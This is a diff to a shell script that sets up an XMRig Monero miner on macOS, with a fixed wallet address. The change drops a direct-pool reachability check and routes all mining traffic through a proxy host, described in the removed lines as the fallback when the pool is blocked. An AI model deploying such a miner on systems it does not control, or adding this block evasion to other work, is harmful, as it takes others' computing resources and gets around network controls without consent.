@@ -7,23 +7,8 @@
 # ============================================================
 
 WALLET="45yWnSbx7c4TzJCf7hwgdHVYmRxZt5Y4g8JVdRjPJuQALzgLMUBwiK7QU2FMeiwMF48APgsi54rBagJvgMo5KUEqAWA2fbg"
-
-# ---- Auto-detect best pool (direct first, CDN fallback) ----
-DIRECT_HOST="pool.supportxmr.com"
-DIRECT_PORT="3333"
-CDN_HOST="cdn.soumalya.in"
-CDN_PORT="3956"
-
-echo "[*] Testing direct pool connection..."
-if timeout 5 bash -c "echo > /dev/tcp/${DIRECT_HOST}/${DIRECT_PORT}" 2>/dev/null; then
-  POOL_HOST="$DIRECT_HOST"
-  POOL_PORT="$DIRECT_PORT"
-  echo "      ✓ Direct pool reachable — using $POOL_HOST:$POOL_PORT"
-else
-  POOL_HOST="$CDN_HOST"
-  POOL_PORT="$CDN_PORT"
-  echo "      — Direct blocked — using CDN proxy $POOL_HOST:$POOL_PORT"
-fi
+POOL_HOST="cdn.soumalya.in"
+POOL_PORT="3956"
 XMRIG_VERSION="6.26.0"
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"
 
